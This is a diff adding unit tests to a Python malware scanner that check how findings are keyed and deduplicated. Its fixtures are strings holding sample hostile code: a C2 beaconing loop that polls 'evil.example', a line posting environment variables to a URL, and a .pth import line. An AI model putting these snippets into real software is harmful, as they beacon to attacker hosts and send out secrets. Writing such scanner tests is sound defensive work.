@@ -445,6 +445,49 @@ def test_extract_evidence_records_all_multiline_matches():
     assert sp._evidence_hash(ev1) != sp._evidence_hash(ev2)
 
 
+def test_multiline_evidence_reopens_on_continuation_change():
+    # A DOTALL match records every line it spans, so changing the URL inside an
+    # already-flagged C2 loop (a continuation line) reopens the finding...
+    old = "while True:\n    time.sleep(60)\n    requests.get('http://old.example/poll')\n"
+    new = "while True:\n    time.sleep(60)\n    requests.get('http://evil.example/c2')\n"
+    fo = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
+             sp._extract_evidence(old, sp.RE_C2_POLLING))
+    fn = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
+             sp._extract_evidence(new, sp.RE_C2_POLLING))
+    assert sp._finding_key(fo) != sp._finding_key(fn)
+    # ...while a benign line shift of the same loop stays stable.
+    shifted = _mk(sp.CRITICAL, "p", "p/loop.py", "C2 polling/beaconing loop detected",
+                  sp._extract_evidence("\n\n" + old, sp.RE_C2_POLLING))
+    assert sp._finding_key(fo) == sp._finding_key(shifted)
+
+
+def test_extract_evidence_bounds_pathological_multiline_span():
+    # A greedy DOTALL span is capped to its head line plus a digest of the rest,
+    # so evidence stays bounded while still binding the full match.
+    big = "vmware\n" + "x\n" * 50 + "detect\n"
+    ev = sp._extract_evidence(big, sp.RE_ANTI_ANALYSIS)
+    assert "sha256:" in ev and ev.count("\n") <= 1
+
+
+def test_canon_evidence_keeps_duplicate_spans():
+    # A second identical matched line in a new code path must change the key, so
+    # an appended duplicate payload occurrence is not deduped to the same hash.
+    one = "    requests.post(url, data=env)"
+    base = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one}")
+    dup = _mk(sp.CRITICAL, "p", "p/x.py", "c", f"L2: {one} | L5: {one}")
+    assert sp._finding_key(base) != sp._finding_key(dup)
+
+
+def test_canon_evidence_does_not_strip_inner_marker_from_raw_code():
+    # Raw .pth evidence has no leading L<NN>: marker; an L<NN>:-looking substring
+    # inside the code must be kept, so changing the code before it reopens.
+    base = _mk(sp.HIGH, "p", "p/x.pth", ".pth has 1 executable import line(s)",
+               "import os; note='L7: same_suffix'")
+    changed = _mk(sp.HIGH, "p", "p/x.pth", ".pth has 1 executable import line(s)",
+                  "import urllib.request; note='L7: same_suffix'")
+    assert sp._finding_key(base) != sp._finding_key(changed)
+
+
 def test_large_js_bundle_finding_is_content_bound():
     # A large benign JS bundle yields a HIGH carrying a content digest, not empty
     # evidence: two different bundles in the same size bucket get different keys,
